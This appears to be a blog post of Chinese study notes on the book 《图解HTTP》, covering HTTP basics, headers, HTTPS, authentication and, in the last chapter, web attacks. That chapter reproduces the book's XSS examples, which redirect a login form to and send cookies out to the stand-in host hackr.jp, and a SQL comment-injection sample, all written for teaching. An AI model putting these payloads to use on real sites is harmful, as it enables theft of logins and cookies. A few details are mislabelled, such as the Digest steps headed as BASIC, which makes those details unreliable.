---
title: 《图解HTTP》笔记
date: 2020-11-06 09:28:47
tags:
- http
- network
categories:
---

```
《图解HTTP》- 上野宣 - 2014年5月出版
 
第1章 了解web和网络基础
HTTP 1990年问世。-HTTP/0.9
HTTP/1.0 标准1996年。-RFC1945
HTTP/1.1 目前主流版本，1997年。-RFC2068~RFC2616
HTTP出现主要-解决文本传输问题。
协议：不同硬件、操作系统间通信的一种规则。
TCP/IP协议族层次：应用层、传输层、网络层、数据链路层。
应用层协议：FTP、DNS、HTTP等
传输层协议：TCP、UDP等
网络层协议：IP等
链路层：硬件部分-OS、硬件设备驱动、NIC（网卡）、光纤等。
传输：应用层-传输层-网络层-链路层-链路层-网络层-传输层-应用层。
传输方式：增加首部/删除首部。-封装
IP地址：分配地址。可变/可固定。
MAC地址：网卡所属固定地址。不变。-与IP地址配对
ARP协议：地址解析协议，根据IP反查对应MAC地址。
路由选择-无法全面掌握互联网传输细节。
TCP：字节流，切割报文，可靠传输。
TCP flag：SYN（同步）、ACK（确认）、RST（复位）、URG（紧急）、PSH（推）、FIN（结束）
三次握手：发送端发送SYN-接收端回传SYN/ACK-发送端回传ACK。-保证通信可靠性
DNS：域名解析系统，由域名查IP，或逆向由IP反查域名。
请求过程：客户端请求-DNS解析-TCP报文分割-IP中转-TCP报文重组-服务器。
URI：统一资源标识符，由某个协议方案表示的定位标识符。-RFC2396/RFC3986
URI协议方案：http、ftp、mailto、telnet、file等30种左右。
URL：统一资源定位符，表示资源地点，是URI子集。
绝对URI格式：协议方案名+登陆信息（认证）+服务器地址+端口号+带层次文件路径+查询参数+片段标识符。
上述格式可选项：登陆信息（认证）、端口号（省略则默认）、查询参数、片段标识符（文档内某个位置）。
RFC：request for comments，征求修正意见书，并不是所有应用都符合RFC。
 
 
 
第2章 简单的http协议（基于1.1）
客户端：请求访问文本或图像等资源的一端。建立通信的一端。
服务器端：提供资源响应的一端。
请求报文：请求方法+请求URI+协议版本+请求首部字段（可选）+内容实体。
响应报文：协议版本+状态码+原因短语+响应首部字段+实体。
无状态协议：不对请求和响应之间的通信状态进行保存-无持久化。
保持状态：引入Cookie技术。
GET：获取资源。
POST：传输实体主体。-我想把这条消息告诉你
PUT：传输文件-一般不使用（验证机制/REST标准可能会开放）。目前一般指更新资源。
HEAD：获得报文首部。
DELETE：删除文件，与PUT相反。也不带验证机制。
OPTIONS：询问支持的方法。
TRACE：追踪路径。获取请求通信环。不常用，易引发XST跨站追踪。
CONNECT：要求用隧道协议连接代理。实现用隧道协议进行TCP通信，如SSL/TLS协议加密传输。
LINK与UNLINK：建立/断开与资源的联系。HTTP/1.1废弃。
HTTP/1.1所有连接默认都是持久连接。
管线化技术：不用等待响应亦可直接发送下一请求。即并行发送。
状态管理：cookie，客户端保存cookie，下次请求server会在报文中加入cookie值发送到server。
 
 
 
第3章 HTTP报文内的HTTP信息
HTTP报文：报文首部 + 空行（CR+LF） + 报文主体
请求报文首部：请求行 + 请求首部字段 + 通用首部字段 + 实体首部字段 + 其他
请求行： 请求的方法、请求URI、HTTP版本。
响应报文首部：状态行 + 响应首部字段 + 通用首部字段 + 实体首部字段 + 其他
状态行：状态码、原因短语、HTTP版本。
内容编码：压缩传输。如gzip、compress-unix系统标准压缩、deflate、identity等。
分块传输编码：浏览器逐步显示页面。
MIME机制：Multipurpose Internet Mail Extensions，允许邮件处理文本、图片、视频等。
范围请求：首部字段 Range 来指定资源的 byte 范围。Content-Type=multipart/byteranges
          eg：Range: bytes=5001-10000，response为206。
内容协商机制：指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源，
    例如当浏览器的默认语言为英语或中文，访问相同URI的Web页面时自动显示。
内容协商技术3种类型：服务器驱动协商、客户端驱动协商、透明协商。
 
 
 
第4章 返回结果的HTTP状态码
1XX：Informational（信息性状态码），接收的请求正在处理。
2XX：Success（成功状态码），请求正常处理完毕。
3XX：Redirection（重定向状态码），需要进行附加操作以完成请求。
4XX：Client Error（客户端错误状态码），服务器无法处理请求。
5XX：Server Error（服务器错误状态码），服务器处理请求出错。
HTTP状态码达60余种。
204：不允许返回任何实体的主体，且浏览器显示的页面不发生更新。
206：表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。
301：永久性重定向，表示请求的资源已被分配了新的 URI，更新URI书签。
302：临时性重定向，表示请求的资源已被分配了新的 URI。
303：明确表示客户端应当采用 GET 方法获取资源。
304：不包含任何响应的主体部分，和重定向没有关系。
307：临时重定向，遵照浏览器标准， 不会从 POST 变成 GET。
400：表示请求报文中存在语法错误。
401：表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。
403：表明对请求资源的访问被服务器拒绝。
404：无法找到请求的资源。
500：服务器端在执行请求时发生了错误。
503：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。
 
 
 
第5章 与HTTP协作的web服务器
若www.tricorder.jp和www.hackr.jp同时部署在同一个服务器上（相同的IP地址），
使用DNS服务解析域名后，两者的访问IP地址会相同，在相同的 IP 地址下，
由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，
必须在 Host 首部内完整指定主机名或域名的 URI。
通信数据转发程序：代理、网关、隧道
代理：是一种有转发功能的应用程序，扮演了位于服务器和客户端“中间人”的角色，正向/反向代理。
网关：转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。
隧道：隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。
缓存代理：缓存资源副本，下次请求无需从源服务器获取资源。
透明代理：转发请求或响应时，不对报文做任何加工的代理。
网关能使通信线路上的服务器提供非 HTTP 协议服务。网关能提高通信的安全性。
隧道：如使用SSL等加密手段进行通信，目的是确保客户端能与服务器进行安全的通信。
 
 
 
第6章 HTTP首部
报文首部：请求行、请求首部字段、通用首部字段、实体首部字段、其他。
Content-Type：表示报文主体的对象类型。
 
通用首部字段（如下）：
Cache-Control：控制缓存的行为
Connection：逐跳首部、连接的管理
Date：创建报文的日期时间
Pragma：报文指令
Trailer：报文末端的首部一览
Transfer-Encoding：指定报文主体的传输编码方式
Upgrade：升级为其他协议
Via：代理服务器的相关信息
Warning：错误通知
 
请求首部字段（如下）：
Accept：用户代理可处理的媒体类型
Accept-Charset：优先的字符集
Accept-Encoding：优先的内容编码
Accept-Language：优先的语言（自然语言）
Authorization：Web认证信息
Expect：期待服务器的特定行为
From：用户的电子邮箱地址
Host：请求资源所在服务器
If-Match：比较实体标记（ETag）
If-Modified-Since：比较资源的更新时间
If-None-Match：比较实体标记（与If-Match相反）
If-Range：资源未更新时发送实体Byte的范围请求
If-Unmodified-Since：比较资源的更新时间（与If-Modified-Since相反）
Max-Forwards：最大传输逐跳数
Proxy-Authorization：代理服务器要求客户端的认证信息
Range：实体的字节范围请求
Referer：对请求中URI的原始获取方
TE：传输编码的优先级
User-Agent：HTTP 客户端程序的信息
 
响应首部字段（如下）：
Accept-Ranges：是否接受字节范围请求
Age：推算资源创建经过时间
ETag：资源的匹配信息
Location：令客户端重定向至指定URI
Proxy-Authenticate：代理服务器对客户端的认证信息
Retry-After：对再次发起请求的时机要求
Server：HTTP服务器的安装信息
Vary：代理服务器缓存的管理信息
WWW-Authenticate：服务器对客户端的认证信息
 
实体首部字段（如下）：
Allow：资源可支持的HTTP方法
Content-Encoding：实体主体适用的编码方式
Content-Language：实体主体的自然语言
Content-Length：实体主体的大小（单位 ：字节）
Content-Location：替代对应资源的URI
Content-MD5：实体主体的报文摘要
Content-Range：实体主体的位置范围
Content-Type：实体主体的媒体类型
Expires：实体主体过期的日期时间
Last-Modified：资源的最后修改日期时间
 
除了RFC2616中定义的47种首部字段，还有 Cookie、 Set-Cookie 和 Content-Disposition
等在其他 RFC 中定义的首部字段。这些非正式的首部字段统一归纳在 RFC4229 HTTP Header Field
Registrations 中。
HTTP 首部字段将定义成缓存代理和非缓存代理的行为，分为：端到端首部、逐跳首部。
 
缓存请求指令（如下）：
no-cache：强制向源服务器再次验证
no-store：不缓存请求或响应的任何内容
max-age = [秒]：响应的最大Age值，必需，代表资源保存为缓存的最长时间
max-stale( = [秒])：接收已过期的响应，可省略
min-fresh = [秒]：期望在指定时间内的响应仍有效，必需
no-transform：代理不可更改媒体类型
only-if-cached：从缓存获取资源
cache-extension：新指令标记（token）
 
缓存响应指令（如下）：
public：可向任意方提供响应的缓存
private：仅向特定用户返回响应
no-cache：缓存前必须先确认其有效性
no-store：不缓存请求或响应的任何内容
no-transform：代理不可更改媒体类型
must-revalidate：可缓存但必须再向源服务器进行确认
proxy-revalidate：要求中间缓存服务器对缓存的响应有效性再进行确认
max-age = [秒]：响应的最大Age值，代表资源保存为缓存的最长时间
s-maxage = [秒]：公共缓存服务器响应的最大Age值
cache-extension：新指令标记（token）
 
Connection 首部字段两个作用：控制不再转发给代理的首部字段、管理持久连接。
  Connection: 不再转发的首部字段名
  Connection: close
  Connection: Keep-Alive
 
HTTP/1.1 警告码（如下）：
Response is stale（响应已过期）：代理返回已过期的资源
Revalidation failed（再验证失败）：代理再验证资源有效性时失败（服务器无法到达等原因）
Disconnection operation （断开连接操作）：代理与互联网连接被故意切断
Heuristic expiration（试探性过期）：响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）
Miscellaneous warning（杂项警告）：任意的警告内容
Transformation applied（使用了转换）：代理对内容编码或媒体类型等执行了某些处理时
Miscellaneous persistent warning（持久杂项警告）：任意的警告内容
 
Accept-Encoding：用户代理支持的内容编码及内容编码的优先级顺序，gzip/compress/deflate/identity
 
Cookie 的工作机制是用户识别及状态管理。
为 Cookie 服务的首部字段（如下）：
Set-Cookie：开始状态管理所使用的Cookie信息，响应首部字段。
Cookie：服务器接收到的Cookie信息，请求首部字段。
 
Set-Cookie 字段的属性（如下）：
NAME=VALUE：赋予Cookie的名称和其值（必需项）
expires=DATE：Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）
path=PATH：将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）
domain=域名：作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）
Secure：仅在HTTPS安全通信时才会发送Cookie
HttpOnly：加以限制，使Cookie不能被JavaScript脚本访问，防止跨站脚本攻击XSS
 
X-Frame-Options：HTTP响应首部，防止点击劫持。DENY/SAMEORIGIN
X-XSS-Protection：HTTP响应首部，控制浏览器 XSS 防护机制的开关。0关闭/1打开
DNT：Do Not Track，拒绝被精准广告追踪，拒绝个人信息被收集。0同意/1拒绝。
P3P：在线隐私偏好平台，保护用户隐私。
 
 
 
第7章 确保Web安全的HTTPS
HTTP的不足：明文-内容可被窃听，无身份验证-可被伪装，无法证明报文完整性-可篡改。
HTTP + 加密 + 认证 + 完整性保护 =HTTPS
SSL是当今世界上应用最为广泛的网络安全技术
近代的加密方法中加密算法是公开的， 而密钥却是保密的。
SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。
加密和解密同用一个密钥的方式称为共享密钥加密，也被叫做对称密钥加密。
公开密钥加密：非对称的密钥，公钥加密、私钥解密。
 
HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。
公开密钥加密与共享密钥加密相比，其处理速度要慢。在交换密钥环节使用公开密钥加密方式， 
之后的建立通信交换报文阶段则使用共享密钥加密方式。
公开密钥加密方式还是存在一些问题的，那就是无法证明公开密钥本身就是货真价实的公开密钥。
有可能真正的公开密钥在发送过程中已经被攻击者替换掉了。
可以使用由数字证书认证机构和其相关机关颁发的公开密钥证书解决上述问题。流程如下。
（1）服务器的运营人员向数字证书认证机构提出公开密钥的申请
（2）数字证书认证机构判明提出申请者的身份
（3）数字证书认证机构对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥。
（4）数字证书认证机构将该公开密钥放入公钥证书后绑定在一起
（5）服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信
（6）接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证
（7）认证通过说明：认证服务器的公开密钥的是真实有效的数字证书认证机构，服务器的公开密钥是值得信赖的
或
（1）服务器把自己的公开密钥登录至数字证书认证机构
（2）数字证书认证机构用自己的私有密钥向服务器的公开密码署数字签名并颁发公钥证书
（3）客户端拿到服务器的公钥证书后，使用数字证书认证机构的公开密钥，向数字证书认证机构验
     证公钥证书上的数字签名，以确认服务器的公开密钥的真实性
（4）使用服务器的公开密钥对报文加密后发送
（5）服务器用私有密钥对报文解密
 
如果使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书，
但该服务器证书在互联网上不可作为证书使用，自认证机构能够产生的作用顶多也就是自己对外宣称
“我是○○”的这种程度。 注意，中级认证机构的证书也可能会变成自认证证书。
 
以 SSL3.0 为基准，后又制定了 TLS1.0、 TLS1.1 和 TLS1.2。TSL 是以 SSL 为原型开发的协议，
有时会统一称该协议为 SSL，
HTTPS也存在一些问题，那就是当使用SSL时，由于HTTPS还需要做服务器、客户端双方加密及
解密处理，因此会消耗CPU和内存等硬件资源，并且和HTTP通信相比，SSL通信部分消耗网络资源，
所以它的处理速度会慢。解决办法-SSL加速器。
要使用HTTPS，向CA购买必不可少，证书有顶级EV SSL 证书，专业级OV SSL 证书，基础级DV SSL 证书
目前一个基础级证书年费大概几百RMB。顶级1w RMB左右。
 
 
 
第8章 确认访问用户身份的认证
何为认证：
（1）密码：只有本人才会知道的字符串信息
（2）动态令牌：仅限本人持有的设备内显示的一次性密码。
（3）数字证书：仅限本人（终端）持有的信息
（4）生物认证：指纹和虹膜等本人的生理信息
（5）IC卡等：仅限本人持有的信息
 
HTTP/1.1 使用的认证方式：
（1）BASIC 认证（基本认证）
（2）DIGEST 认证（摘要认证）
（3）SSL 客户端认证
（4）FormBase 认证（基于表单认证）
（5）Windows 统一认证（Keberos 认证、 NTLM 认证）
 
BASIC 认证的认证步骤：
（1）客户端发送请求
（2）服务端返回状态码401以告知客户端需要进行认证
（3）客户端将用户ID和密码以Base64方式编码后发送（如Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=）
（4）服务段认证成功则返回状态码200，若认证失败则返回状态码401
BASIC 认证使用上不够便捷灵活， 且达不到多数 Web 网站期望的安全性等级，因此它并不常用。
 
BASIC认证：HTTP/1.1 起，使用质询 / 响应的方式：
（1）客户端提出认证要求
（2）发送临时的质询码（随机数，nonce）以及告知需要认证的状态码401
（3）客户端发送摘要以及由质询码计算出的响应码（response）
（4）服务段认证成功返回状态码200，失败则再次发送状态码401
DIGEST 认证提供了高于 BASIC 认证的安全等级，有效防止了密码泄露问题。
 
SSL客户端认证：利用SSL客户端认证可以避免用户ID和密码被盗情况下被第三者冒充。
（1）接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。
（2）用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。
（3）服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信
服务器需事先将客户端证书分发给客户端，且客户端必须安装此证书。
 
双因素认证：依靠证书认证和基于表单认证的组合
 
 
 
第9章 基于HTTP的功能追加协议
Ajax：异步 JavaScript 与 XML技术，局部 Web 页面替换加载的异步通信手段
Comet：一旦服务器端有内容更新了， Comet 不会让请求等待，而是直接给客户端返回响应
SPDY：的设计与功能：多路复用流、赋予请求优先级、压缩 HTTP 首部、推送功能、服务器
    提示功能。是一种有效消除 HTTP 瓶颈的技术。
WebSocket：即 Web 浏览器与 Web 服务器之间全双工通信标准。连接的发起方仍是客户端，
    而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。
    特点是推送功能、减少通信量，为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，
    告知服务器通信协议发生改变，以达到握手的目的，成功握手确立 WebSocket 连接之后，通信时
    不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。
 
HTTP/2.0 的 7 项技术及讨论：
（1）多路复用-SPDY
（2）TLS义务化-Speed＋Mobility
（3）协商：Speed＋Mobility，Friendly
（4）客户端拉曳（Client Pull）/服务器推送（Server Push）-Speed＋Mobility
（5）流量控制：SPDY
（6）WebSocket：Speed＋Mobility
 
Web 服务器管理文件的 WebDAV：是一个可对 Web 服务器上的内容直接
进行文件复制、 编辑等操作的分布式文件系统。
 
 
 
第10章 构建web内容的技术
HTML：超文本标记语言。
CSS：层叠样式表。
动态 HTML：通过调用客户端脚本语言 JavaScript，实现对HTML 的 Web 页面的动态改造。
DOM：DOM是用以操作HTML文档和XML文档的API，使用DOM可以将 HTML 内的元素当作对象操作。
CGI：通用网关接口，指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。
Servlet
XML
JSON：JSON（JavaScript Object Notation）是一种以 JavaScript（ECMAScript）的对象表示法为
      基础的轻量级数据标记语言。能够处理的数据类型有false/null/true/对象/数组/数字/字符串。
 
 
 
第11章 Web的攻击技术
对 Web 应用的攻击模式：主动攻击、被动攻击
主动攻击：SQL 注入攻击、 OS 命令注入攻击。
被动攻击：利用圈套策略执行攻击代码的攻击模式，如是跨站脚本攻击、跨站点请求伪造
 
 
XSS攻击例子1-url传脚本：
url：
http://example.jp/login?ID="><script>var+f=document⇒
.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method=⇒
"get";</script><span+s="
 
html篡改：
<div class="logo">
  <img src="/img/logo.gif" alt="E拍卖会 />
</div>
<form action="http://example.jp/login" method="post" id="login">
<div class="input_id">
  ID <input type="text" name="ID" value=""><script>var f=document⇒
.getElementById("login"); f.action="http://hackr.jp/pwget"; f.method=⇒
"get";</script><span s="" />
</div>
XSS攻击例子2-传入第三方js：
传入第三方脚本：
<script src=http://hackr.jp/xss.js></script>
传入脚本内容
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
SQL注入例子-传入注释符号：
SELECT * FROM bookTbl WHERE author ='上野宣 '--' and flag=1;
OS注入：OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操
作系统的命令行启动程序，通过 OS 注入攻击可执行 OS 上安装着的各种程序。
HTTP首部注入攻击：攻击者可在响应中插入任意的首部字段
邮件首部注入攻击：对任意邮件地址发送广告邮件或病毒邮件
目录遍历攻击：用户可使用 .../ 等相对路径定位到 /etc/passed 等绝对路径上
远程文件包含漏洞：攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击
会话劫持：指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户
会话固定攻击：强制用户使用攻击者指定的会话 ID
跨站点请求伪造CSRF：设置陷阱强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新
密码破解攻击：试错（穷举法和字典攻击）、破解
从加密过的数据中导出明文：
（1）通过穷举法·字典攻击进行类推
（2）彩虹表
（3）拿到密钥
（4）加密算法的漏洞
点击劫持（界面伪装）：诱使用户在不知情的情况下点击链接
DoS 攻击：服务停止攻击或拒绝服务攻击，如资源过载或攻击安全漏洞使服务停止
DDoS攻击：多台计算机发起的 DoS 攻击称为 DDoS 攻击
后门程序：开发设置的隐藏入口
```
